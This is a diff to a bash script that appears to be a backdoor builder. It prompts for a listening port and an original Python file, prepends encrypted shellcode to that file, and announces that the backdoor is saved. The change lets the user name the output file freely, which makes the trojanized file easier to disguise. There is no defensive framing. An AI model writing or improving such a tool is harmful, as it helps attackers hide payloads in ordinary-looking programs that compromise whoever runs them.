@@ -26,6 +26,9 @@ read -p "$cyan[ + ] LPORT : " lp
 echo ""
 read -p "$cyan[ + ] path to Original File [ PYTHON ] : " pyfile
 echo ""
+read -p "$cyan[ + ] Name File : " pyname
+echo ""
+sleep 0.7
 if [ -f $pyfile ]; then
         echo "$lightgreen[ + ] File $(basename $pyfile) Found!"
         echo ""
@@ -46,14 +49,14 @@ wait $PID
 sleep 1
 echo "$lightgreen[ # ] Encrypting shellcode ..." | pv -qL 10
 echo ""
-cat temp.txt > nothing.py
-echo '' >> nothing.py
-cat $pyfile >> nothing.py
+cat temp.txt > $pyname.py
+echo '' >> $pyname.py
+cat $pyfile >> $pyname.py
 sleep 0.5
 echo "$lightgreen[ + ] Shellcode encrypted ..." | pv -qL 10
 echo ""
 sleep 1
-echo "$lightgreen[ + ] Backdoor saved in folder --> $PWD/nothing.py" | pv -qL 10
+echo "$lightgreen[ + ] Backdoor saved in folder --> $PWD/$pyname.py" | pv -qL 10
 echo ""
 sleep 1.5
 echo "$lightgreen[ + ] Cleaning up ... " | pv -qL 10
